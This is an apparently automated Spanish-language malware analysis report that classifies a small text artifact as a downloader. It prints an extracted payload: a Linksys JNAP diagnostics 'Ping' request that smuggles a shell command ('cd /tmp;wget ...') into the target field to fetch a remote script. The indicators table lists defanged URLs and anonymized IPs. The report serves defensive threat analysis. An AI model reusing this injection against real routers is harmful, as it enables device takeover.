# 🧬 Payload Analysis

`2cd418902688de219bb72a3e427cbcf93deb0e19ca324ae9d6ae16d814eec359`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `2cd418902688de219bb72a3e427cbcf93deb0e19ca324ae9d6ae16d814eec359`
- **MD5:** `0492dd882fb5706bae3065dafdede6cb`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 465 B |
| Entropía | 5.32 |
| Strings | 7 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/network/Diagnostics","command":"Ping","target":"[internal-ip-redacted]%20`cd /tmp;wget htt
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://linksys[.]com/jnap/network/Diagnostics | strings |
| hash | 2cd418902688de219bb72a3e427cbcf93deb0e19ca324ae9d6ae16d814eec359 | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/network/Diagnostics","command":"Ping","target":"[internal-ip-redacted]%20`cd /tmp;wget htt | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
